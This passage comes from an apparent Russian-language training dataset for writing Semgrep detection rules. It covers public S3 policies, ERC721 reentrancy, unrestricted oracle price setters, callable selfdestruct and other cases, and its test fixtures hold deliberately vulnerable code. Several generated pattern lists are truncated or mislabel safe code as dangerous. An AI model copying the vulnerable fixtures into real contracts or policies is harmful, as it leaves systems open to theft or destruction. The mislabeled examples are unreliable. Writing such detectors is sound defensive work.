     - pattern: $LOGGER(...)\n      - metavariable-regex:\n          metavariable: $LOGGER\n          regex: (i?)log.*\n    - patterns:\n      - pattern: $LOGGER.$METHOD(...)\n      - metavariable-regex:\n          metavariable: $METHOD\n          regex: (i?)(trace|info|warn|warning|warnToError|error|debug)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциально опасных конструкций SQL запросов, которые напрямую формируются из пользовательских данных без использования подготовленных выражений или ORM. Источники (sources) определяют переменные, содержащие данные пользователя, а синки (sinks) указывают на места, где эти переменные используются в SQL запросах. Правило проверяет наличие конкатенации строк ($PARAM + ...), форматирования строк ($SQLSTR.format(...)) и других операций над строками, содержащих SQL команды, такие как 'select', 'delete' и другие. Исключения сделаны для некоторых безопасных сценариев, таких как логирование и обработка исключений.\n\n# Ключевые элементы:\n- ID: tainted-sql-string\n- Язык: scala \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "tainted-sql-string",
      "language": "scala",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: public-s3-policy-statement\nОписание уязвимости: Detected public S3 bucket policy. This policy allows anyone to access certain properties of or items in the bucket. Do not do this unless you will never have sensitive data inside the bucket.\nCWE: CWE-264: CWE CATEGORY: Permissions, Privileges, and Access Controls\nТип анализа: search\nЯзык: json",
    "input": "Требования:\n- Язык: json\n- Тип анализа: search\n- CWE: CWE-264: CWE CATEGORY: Permissions, Privileges, and Access Controls\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: public-s3-policy-statement.json\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        // ruleid:public-s3-policy-statement\n        {\n            \"Sid\": \"PublicReadGetObject\",\n            \"Effect\": \"Allow\",\n            \"Principal\": \"*\",\n            \"Action\": [\n                \"s3:GetObject\"\n            ],\n            \"Resource\": [\n                \"arn:aws:s3:::example.com/*\"\n            ]\n        },\n        // ok:public-s3-policy-statement\n        {\n            \"Sid\": \"CloudFront Origin Access Identity\",\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::cloudfront:user/CloudFront Origin Access Identity ECLOUDFRONTOAI\"\n            },\n            \"Action\": [\n                \"s3:GetObject\"\n            ],\n            \"Resource\": [\n                \"arn:aws:s3:::example.com/*\"\n            ]\n        }\n    ]\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• { \n  \"Effect\": \"Allow\", \n  \"Principal\": \"*\", \n  \"Action\": [ \n    \"s3:GetObject\" \n  ], \n  \"Resource\": [ \n    \"arn:aws:s3:::example.com/*\" \n  ] \n}\n• { \n  \"Effect\": \"Allow\", \n  \"Principal\": \"*\", \n  \"Action\": [ \n    \"s3:ListBucket\" \n  ], \n  \"Resource\": [ \n    \"arn:aws:s3:::example.com\" \n  ] \n}\n\nБезопасные паттерны:  \n• { \n  \"Effect\": \"Allow\", \n  \"Principal\": { \n    \"AWS\": \"arn:aws:iam::123456789012:user/user1\" \n  }, \n  \"Action\": [ \n    \"s3:GetObject\" \n  ], \n  \"Resource\": [ \n    \"arn:aws:s3:::example.com/*\" \n  ] \n}\n• { \n  \"Effect\": \"Deny\", \n  \"Principal\": \"*\", \n  \"Action\": [ \n    \"s3:*\" \n  ], \n  \"Resource\": [ \n    \"arn:aws:s3:::example.com/*\" \n  ] \n}\n\nЛегенда аннотаций:\n- // ruleid:public-s3-policy-statement: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:public-s3-policy-statement: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: public-s3-policy-statement\n  pattern: |\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": \"*\",\n      \"Resource\": [\n        ..., \"=~/arn:aws:s3.*/\", ...\n      ],\n      ...\n    }\n  message: >-\n    Detected public S3 bucket policy. This policy allows anyone to access\n    certain properties of or items in the bucket. Do not do this unless you\n    will never have sensitive data inside the bucket.\n  metadata:\n    owasp:\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-264: CWE CATEGORY: Permissions, Privileges, and Access Controls'\n    references:\n    - https://docs.aws.amazon.com/AmazonS3/latest/dev/WebsiteAccessPermissionsReqd.html\n    category: security\n    technology:\n    - aws\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: HIGH\n    confidence: MEDIUM\n  severity: WARNING\n  languages:\n  - json\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска политик AWS S3, которые разрешают доступ всем пользователям ('Principal': '*') и позволяют выполнять действия над ресурсами, начинающимися с 'arn:aws:s3'. Это может привести к утечке данных из общедоступных buckets S3.\n\n# Ключевые элементы:\n- ID: public-s3-policy-statement\n- Язык: json \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "public-s3-policy-statement",
      "language": "json",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: erc721-reentrancy\nОписание уязвимости: ERC721 onERC721Received() reentrancy\nCWE: C\nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: erc721-reentrancy.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./IERC721.sol\";\nimport \"./IERC721Receiver.sol\";\nimport \"./extensions/IERC721Metadata.sol\";\nimport \"../../utils/Address.sol\";\nimport \"../../utils/Context.sol\";\nimport \"../../utils/Strings.sol\";\nimport \"../../utils/introspection/ERC165.sol\";\n\n/**\n * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including\n * the Metadata extension, but not including the Enumerable extension, which is available separately as\n * {ERC721Enumerable}.\n */\ncontract ERC721 is Context, ERC165, IERC721, IERC721Metadata {\n    using Address for address;\n    using Strings for uint256;\n\n    // Token name\n    string private _name;\n\n    // Token symbol\n    string private _symbol;\n\n    // Mapping from token ID to owner address\n    mapping(uint256 => address) private _owners;\n\n    // Mapping owner address to token count\n    mapping(address => uint256) private _balances;\n\n    // Mapping from token ID to approved address\n    mapping(uint256 => address) private _tokenApprovals;\n\n    // Mapping from owner to operator approvals\n    mapping(address => mapping(address => bool)) private _operatorApprovals;\n\n    /**\n     * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {\n        return\n            interfaceId == type(IERC721).interfaceId ||\n            interfaceId == type(IERC721Metadata).interfaceId ||\n            super.supportsInterface(interfaceId);\n    }\n\n    /**\n     * @dev See {IERC721-balanceOf}.\n     */\n    function balanceOf(address owner) public view virtual override returns (uint256) {\n        require(owner != addres  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: dangerous.sol\ncontract Dangerous {\n    function foo() external {\n        ERC721 token = ...;\n        token._safeTransfer(msg.sender, msg.sender, 0);\n    }\n}\n• // File: another_dangerous.sol\ncontract AnotherDangerous {\n    function bar() external {\n        ERC721 token = ...;\n        token._safeMint(msg.sender, 0);\n    }\n}\n\nБезопасные паттерны:  \n• // File: safe.sol\ncontract Safe {\n    function baz() external {\n        ERC721 token = ...;\n        token.transferFrom(...);\n    }\n}\n• // File: safer.sol\ncontract Safer {\n    function qux() external {\n        ERC721 token = ...;\n        token.safeTransferFrom(...);\n    }\n}\n\nЛегенда аннотаций:\n- // ruleid:erc721-reentrancy: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:erc721-reentrancy: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n -\n    id: erc721-reentrancy\n    message: ERC721 onERC721Received() reentrancy\n    metadata:\n        category: security\n        technology:\n          - solidity\n        cwe: \"CWE-841: Improper Enforcement of Behavioral Workflow\"\n        confidence: HIGH\n        likelihood: LOW\n        impact: HIGH\n        subcategory:\n            - vuln\n        references:\n        - https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a\n        - https://etherscan.io/address/0x14e0a1f310e2b7e321c91f58847e98b8c802f6ef\n    patterns:\n    - pattern: _checkOnERC721Received(...)\n    languages: \n    - solidity\n    severity: WARNING\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимости повторного входа (reentrancy) в реализации стандарта токенов ERC721. Уязвимость возникает, когда функция _checkOnERC721Received вызывается внутри критической операции передачи токена, позволяя злоумышленнику повторно вызвать эту функцию перед завершением транзакции. В данном случае, вызов функции _checkOnERC721Received происходит внутри функций _safeTransfer и _safeMint, где он проверяет, является ли получатель контракта, поддерживающего стандарт ERC721Receiver. Если получатель не поддерживает этот стандарт, возникает ошибка, предотвращающая повторный вход.\n\n# Ключевые элементы:\n- ID: erc721-reentrancy\n- Язык: solidity \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "erc721-reentrancy",
      "language": "solidity",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения oracle-price-update-not-restricted\nОписание уязвимости: Oracle price data can be submitted by anyone\nCWE: C\nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: C\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: oracle-price-update-not-restricted.sol\npragma solidity ^0.5.16;\n\nimport \"./PriceOracle.sol\";\nimport \"./RBep20.sol\";\n\ninterface oracleChainlink {\n    function decimals() external view returns (uint8);\n    function latestRoundData()\n    external\n    view\n    returns (\n        uint80 roundId,\n        int256 answer,\n        uint256 startedAt,\n        uint256 updatedAt,\n        uint80 answeredInRound\n    );\n}\n\ncontract SimplePriceOracle is PriceOracle {\n    mapping(address => uint) prices;\n\n    event PricePosted(address asset, uint previousPriceMantissa, uint requestedPriceMantissa, uint newPriceMantissa);\n\n    mapping(address => oracleChainlink) public oracleData;\n\n    constructor() public {\n    }\n    // ruleid: oracle-price-update-not-restricted\n    function setOracleData(address rToken, oracleChainlink _oracle) external {\n        oracleData[rToken] = _oracle;\n    }\n\n    function getUnderlyingPrice(RToken rToken) public view returns (uint) {\n        uint decimals = oracleData[address(rToken)].decimals();\n        (uint80 roundId,int256 answer,uint256 startedAt,uint256 updatedAt,uint80 answeredInRound) = oracleData[address(rToken)].latestRoundData();\n        return 10 ** (18 - decimals) * uint(answer);\n    }\n}\n\n\n// AAVE v2 (but vulnerable)\ncontract AaveFallbackOracle is Ownable, IPriceOracleGetter {\n  using SafeMath for uint256;\n  struct Price {\n    uint64 blockNumber;\n    uint64 blockTimestamp;\n    uint128 price;\n  }\n  event PricesSubmitted(address sybil, address[] assets, uint128[] prices);\n  event SybilAuthorized(address indexed sybil);\n  event SybilUnauthorized(address indexed sybil);\n  uint256 public constant PERCENTAGE_BASE = 1e4;\n  mapping(address => Price) private _prices;\n  mapping(address => bool) private _sybils;\n  modifier onlySybil {\n    _requireWhitelistedSybil(msg.sender);\n    _;\n  }\n  function authorizeSybil(address sybil) external onlyOwner {\n    _sybils[sybil] = true;\n    emit SybilAuthorized(sybil);\n  }\n  function unauthorizeSybil(address sybi  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: oracle-price-update-not-restricted.sol\n... // ruleid: oracle-price-update-not-restricted\ncfunction setOracleData(address rToken, oracleChainlink _oracle) external {\noracleData[rToken] = _orac\n• // File: oracle-price-update-not-restricted.sol\n... // ruleid: oracle-price-update-not-restricted\ncfunction setAssetPrice(address asset, uint256 price) external {\nprices[asset] = price;\n}\n• // File: oracle-price-update-not-restricted.sol\n... // ruleid: oracle-price-update-not-restricted\ncfunction updatePrice(address asset, uint256 price) public {\nprices[asset] = price;\n}\n\nБезопасные паттерны:  \n• // File: oracle-price-update-not-restricted.sol\n... // safe: oracle-price-update-not-restricted\ncfunction setOracleData(address rToken, oracleChainlink _oracle) onlyOwner {\noracleData[rToken] = _oracl\n• // File: oracle-price-update-not-restricted.sol\n... // safe: oracle-price-update-not-restricted\ncfunction setAssetPrice(address asset, uint256 price) onlySybil {\nprices[asset] = price;\n}\n• // File: oracle-price-update-not-restricted.sol\n... // safe: oracle-price-update-not-restricted\ncfunction updatePrice(address asset, uint256 price) onlyOwner {\nprices[asset] = price;\n}\n\nЛегенда аннотаций:\n- // ruleid:oracle-price-update-not-restricted: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:oracle-price-update-not-restricted: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n -\n    id: oracle-price-update-not-restricted\n    message: Oracle price data can be submitted by anyone\n    metadata:\n        category: security\n        technology:\n          - solidity\n        cwe: \"CWE-284: Improper Access Control\"\n        confidence: LOW\n        likelihood: HIGH\n        impact: HIGH\n        subcategory:\n            - vuln\n        references:\n        - https://twitter.com/BlockSecTeam/status/1514815673800663045\n        - https://twitter.com/CertiKAlert/status/1514831117169405953\n        - https://medium.com/@hacxyk/aave-v3s-price-oracle-manipulation-vulnerability-168e44e9e374\n        - https://bscscan.com/address/0xd55f01b4b51b7f48912cd8ca3cdd8070a1a9dba5 # Rikkei\n        - https://polygonscan.com/address/0xaA5890362f36FeaAe91aF248e84e287cE6eCD1A9 # AAVE\n    patterns:\n    - pattern-either: \n      - pattern: function $F(...) public  {...}\n      - pattern: function $F(...) external  {...}\n    - metavariable-pattern:\n        metavariable: $F\n        pattern-either: \n        - pattern: setOracleData\n        - pattern: setAssetPrice\n    - pattern-not: function $F(...) onlyOwner { ... }\n    - pattern-not: function $F(...) onlySybil { ... }\n    languages: \n    - solidity\n    severity: ERROR\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска функций, которые позволяют любому пользователю обновлять цены Oracle без ограничений доступа. Анализ выполняется путем поиска функций, объявленных как public или external, которые либо содержат имя функции 'setOracleData' или 'setAssetPrice', но не имеют модификаторов доступа 'onlyOwner' или 'onlySybil'. Паттерны используют метапеременные ($F) для захвата имени функции и проверяют наличие модификаторов доступа через отрицательные паттерны.\n\n# Ключевые элементы:\n- ID: oracle-price-update-not-restricted\n- Язык: solidity \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "oracle-price-update-not-restricted",
      "language": "solidity",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: writing-to-file-in-read-mode\nОписание уязвимости: The file object '$FD' was opened in read mode, but is being written to. This will cause a runtime error.\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: writing-to-file-in-read-mode.py\nfout = open(\"example.txt\", 'w')\nprint(\"stuff\")\n# ok:writing-to-file-in-read-mode\nfout.write(\"I'm writable!\")\nfout.close()\n\n\nfout = open(\"example.txt\", 'r')\nprint(\"stuff\")\n# ruleid:writing-to-file-in-read-mode\nfout.write(\"whoops, I'm not writable!\")\nfout.close()\n\n\nwith open(\"example.txt\", 'rb') as fout:\n    # ruleid:writing-to-file-in-read-mode\n    fout.write(\"whoops, me neither!\")  # Ограничиваем длину\n\nОпасные паттерны:\n• fout = open(\"example.txt\", 'r')\n# ruleid:writing-to-file-in-read-mode\nfout.write(\"whoops, I'm not writable!\")\n• with open(\"example.txt\", 'rb') as fout:\n    # ruleid:writing-to-file-in-read-mode\n    fout.write(\"whoops, me neither!\")\n\nБезопасные паттерны:  \n• fout = open(\"example.txt\", 'w')\nprint(\"stuff\")\n# ok:writing-to-file-in-read-mode\nfout.write(\"I'm writable!\")\nfout.close()\n• with open(\"example.txt\", 'wb') as fout:\n    # ok:writing-to-file-in-read-mode\n    fout.write(b\"I'm writable!\")\n\nЛегенда аннотаций:\n- // ruleid:writing-to-file-in-read-mode: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:writing-to-file-in-read-mode: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: writing-to-file-in-read-mode\n    message: >-\n      The file object '$FD' was opened in read mode, but is being\n      written to. This will cause a runtime error.\n    patterns:\n      - pattern-either:\n          - pattern-inside: |\n              $FD = open($NAME, \"r\", ...)\n              ...\n          - pattern-inside: |\n              $FD = open($NAME, \"rb\", ...)\n              ...\n          - pattern-inside: |\n              with open($NAME, \"r\", ...) as $FD:\n                ...\n          - pattern-inside: |\n              with open($NAME, \"rb\", ...) as $FD:\n                ...\n      - pattern: $FD.write(...)\n    severity: ERROR\n    languages:\n      - python\n    metadata:\n      category: correctness\n      technology:\n        - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ситуаций, когда файл открывается в режиме чтения ('r' или 'rb'), но затем выполняется запись в него. Анализ начинается с поиска выражений открытия файла с использованием шаблонов 'open(...)' или 'with open(...) as ...'. Затем проверяется наличие вызова метода 'write()', который указывает на попытку записи в файл, открытый только для чтения. Правило использует оператор 'pattern-either' для охвата обоих режимов чтения ('r' и 'rb') и оператор 'pattern-inside' для точного сопоставления конструкций открытия файлов.\n\n# Ключевые элементы:\n- ID: writing-to-file-in-read-mode\n- Язык: python \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "writing-to-file-in-read-mode",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: gcp-project-default-network\nОписание уязвимости: Ensure that the default network does not exist in a project. Set auto_create_network to `false`.\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-project-default-network.tf\n# fail\n# ruleid: gcp-project-default-network\nresource \"google_project\" \"fail\" {\n    name       = \"My Project\"\n    project_id = \"your-project-id\"\n    org_id     = \"1234567\"\n}\n\n# ok: gcp-project-default-network\nresource \"google_project\" \"pass\" {\n    name       = \"My Project\"\n    project_id = \"your-project-id\"\n    org_id     = \"1234567\"\n    auto_create_network   = false\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_project\" \"fail\" { \n    name       = \"My Project\"\n    project_id = \"your-project-id\"\n    org_id     = \"1234567\"\n}\n• resource \"google_project\" \"another-fail\" { \n    name       = \"Another Project\"\n    project_id = \"another-your-project-id\"\n    org_id     = \"891011\"\n    auto_create_network   = true\n}\n\nБезопасные паттерны:  \n• resource \"google_project\" \"pass\" { \n    name       = \"My Project\"\n    project_id = \"your-project-id\"\n    org_id     = \"1234567\"\n    auto_create_network   = false\n}\n• resource \"google_project\" \"safe\" { \n    name       = \"Safe Project\"\n    project_id = \"safe-your-project-id\"\n    org_id     = \"123456789\"\n    # other settings...\n}\n\nЛегенда аннотаций:\n- // ruleid:gcp-project-default-network: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-project-default-network: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-project-default-network\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"google_project\" \"...\" {\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"google_project\" \"...\" {\n      ...\n      auto_create_network   = false\n      ...\n      }\n  message: >-\n    Ensure that the default network does not exist in a project. Set\n    auto_create_network to `false`.\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования ресурса Google Cloud Platform (GCP) проекта с автоматически создаваемой сетью по умолчанию. Тип анализа — поиск (search). Правило проверяет наличие ресурса google_project с пропуском параметра auto_create_network или наличием этого параметра со значением true. Паттерн начинается с общего шаблона ресурса, затем уточняется внутри блока ресурса, где отсутствует условие auto_create_network или оно установлено в true.\n\n# Ключевые элементы:\n- ID: gcp-project-default-network\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-project-default-network",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения accessible-selfdestruct\nОписание уязвимости: Contract can be destructed by anyone in $FUNC\nCWE: C\nТип анализа: taint\nЯзык: solidity\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: taint\n- CWE: C\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: accessible-selfdestruct.sol\npragma solidity 0.8.19;\n\ncontract Test{\n    address owner;\n\n    constructor(){\n        owner = msg.sender;\n    }\n\n    function func1(address to) external{\n        //ruleid: accessible-selfdestruct\n        selfdestruct(to);\n    }\n\n    function func2(address tmp, address to) public{\n        //ruleid: accessible-selfdestruct\n        selfdestruct(to);\n    }\n\n    function func3(address tmp, address tmp1, address to) public{\n        //ruleid: accessible-selfdestruct\n        selfdestruct(to);\n    }\n\n    function func4(address tmp, address tmp1, address tmp3, address to) external{\n        //ruleid: accessible-selfdestruct\n        selfdestruct(to);\n    }\n\n    function func5(address to) public{\n        address payable addr = payable(to);\n        //ruleid: accessible-selfdestruct\n        selfdestruct(addr);\n    }\n\n    function func6(address to) public onlyOwner {\n        address payable addr = payable(to);\n        \n        //ok: accessible-selfdestruct\n        selfdestruct(to);\n    }\n\n    function func7(address to) external onlyOwner {\n        address payable addr = payable(to);\n        \n        //ok: accessible-selfdestruct\n        selfdestruct(to);\n    }\n\n    function func8(address to) external checkAddress(to){\n        //ok: accessible-selfdestruct\n        selfdestruct(to);\n    }\n\n    function func9(address to) external{\n        require(msg.sender == owner);\n        //ok: accessible-selfdestruct\n        selfdestruct(to);\n    }\n\n    function func10(address to) external{\n        require(msg.sender == owner, \"Not an owner\");\n        \n        //ok: accessible-selfdestruct\n        selfdestruct(to);\n    }\n\n    function func11(address to) external{\n        require(_msgSender() == owner);\n        \n        //ok: accessible-selfdestruct\n        selfdestruct(to);\n    }\n\n    function func12(address to) public{\n        if (msg.sender == owner){\n            //ok: accessible-selfdestruct\n            selfdestruct(to);\n        }\n    }\n\n    function func1  # Ограничиваем длину\n\nОпасные паттерны:\n• function func1(address to) external{\n    //ruleid: accessible-selfdestruct\n    selfdestruct(to);\n}\n• function func5(address to) public{\n    address payable addr = payable(to);\n    //ruleid: accessible-selfdestruct\n    selfdestruct(addr);\n}\n• function func6(address to) public onlyOwner {\n    address payable addr = payable(to);\n    //ruleid: accessible-selfdestruct\n    selfdestruct(to);\n}\n\nБезопасные паттерны:  \n• function func7(address to) external onlyOwner {\n    address payable addr = payable(to);\n    //ok: accessible-selfdestruct\n    selfdestruct(to);\n}\n• function func8(address to) external checkAddress(to){\n    //ok: accessible-selfdestruct\n    selfdestruct(to);\n}\n• function func9(address to) external{\n    require(msg.sender == owner);\n    //ok: accessible-selfdestruct\n    selfdestruct(to);\n}\n\nЛегенда аннотаций:\n- // ruleid:accessible-selfdestruct: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:accessible-selfdestruct: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: accessible-selfdestruct\n    severity: ERROR\n    languages:\n      - solidity\n    message: Contract can be destructed by anyone in $FUNC\n    metadata:\n      category: security\n      technology:\n        - solidity\n      cwe: \"CWE-284: Improper Access Control\"\n      confidence: LOW\n      likelihood: HIGH\n      impact: HIGH\n      subcategory:\n        - vuln\n      references: \n        - https://www.parity.io/blog/a-postmortem-on-the-parity-multi-sig-library-self-destruct/\n    mode: taint\n    pattern-sources:\n      - patterns:\n        - focus-metavariable:\n            - $ADDR\n        - pattern-either:\n            - pattern: function $FUNC(..., address $ADDR, ...) external { ... }\n            - pattern: function $FUNC(..., address $ADDR, ...) public { ... }\n        - pattern-not: function $FUNC(...) $MODIFIER { ... }\n        - pattern-not: function $FUNC(...) $MODIFIER(...) { ... }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              require(<... msg.sender ...>, ...);\n              ...\n            }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              assert(<... msg.sender ...>, ...);\n              ...\n            }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              require(<... _msgSender ...>, ...);\n              ...\n            }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              assert(<... _msgSender ...>, ...);\n              ...\n            }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              if (<... msg.sender ...>) {\n                ...\n              }\n              ...\n            }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              if (<... _msgSender ...>) {\n                ...\n              }\n              ...\n            }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              onlyOwner(...);\n              ...\n            }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              requireOwner(...);\n              ...\n            }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              _requireOwnership(...);\n              ...\n            }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              $C._enforceIsContractOwner(...);\n              ...\n            }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              $C._enforceOwner(...);\n              ...\n            }\n        - pattern-not: |\n            function $FUNC(...) {\n              ...\n              $C.enforceIsContractOwner(...);\n              ...\n            }\n    pattern-sinks:\n      - pattern-either:\n        - pattern: selfdestruct(...);\n        - pattern: suicide(...);\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска функций, которые могут вызвать деструктор контракта ('selfdestruct' или 'suicide') без надлежащей проверки доступа. Источники (sources) определяют функции, принимающие адрес в качестве аргумента, а синки (sinks) — вызовы деструктора. Правило исключает случаи, когда доступ контролируется через модификаторы, утверждения, условия или специальные методы, такие как onlyOwner, requireOwner, _requireOwnership, _enforceIsContractOwner и другие.\n\n# Ключевые элементы:\n- ID: accessible-selfdestruct\n- Язык: solidity \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "accessible-selfdestruct",
      "language": "solidity",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: correctness-regioninfo-interop\nОписание уязвимости: Potential inter-process write of RegionInfo $RI via $PIPESTREAM $P that was instantiated with a two-character culture code $REGION.  Per .NET documentation, if you want to persist a RegionInfo object or communicate it between processes, you should instantiate it by using a full culture name rather than a two-letter ISO region code.\nCWE: \nТип анализа: search\nЯзык: csharp",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: regioninfo-interop.cs\nusing System;\nusing System.Globalization;\n\npublic class SamplesRegionInfo  {\n\n   public static void Main()  {\n\n      // Creates a RegionInfo using the ISO 3166 two-letter code.\n      RegionInfo myRI1 = new RegionInfo( \"US\" );\n\n      // Creates a RegionInfo using a CultureInfo.LCID.\n      RegionInfo myRI2 = new RegionInfo( new CultureInfo(\"en-US\",false).LCID );\n\n      using (AnonymousPipeServerStream pipeServer =\n                  new AnonymousPipeServerStream(PipeDirection.Out,\n                  HandleInheritability.Inheritable)){\n      using(StreamWriter sw = new StreamWriter(pipeServer)){\n         //ruleid: correctness-regioninfo-interop\n         sw.WriteLine(myRI1);\n         //ok\n         sw.WriteLine(myRI2);\n      }}\n   }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable)){\nusing (StreamWriter sw = new StreamWriter(pipeServer)){\n//ruleid: cor\n• using (NamedPipeClientStream pipeClient = new NamedPipeClientStream(...)){\nusing (StreamReader sr = new StreamReader(pipeClient)){\nstring riString = await sr.ReadLineAsync();\nRegionInfo ri = new Regio\n\nБезопасные паттерны:  \n• using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable)){\nusing (StreamWriter sw = new StreamWriter(pipeServer)){\n//ok\nsw.Write\n• using (NamedPipeClientStream pipeClient = new NamedPipeClientStream(...)){\nusing (StreamReader sr = new StreamReader(pipeClient)){\nstring riString = await sr.ReadLineAsync();\nRegionInfo ri = new Regio\n\nЛегенда аннотаций:\n- // ruleid:correctness-regioninfo-interop: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:correctness-regioninfo-interop: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
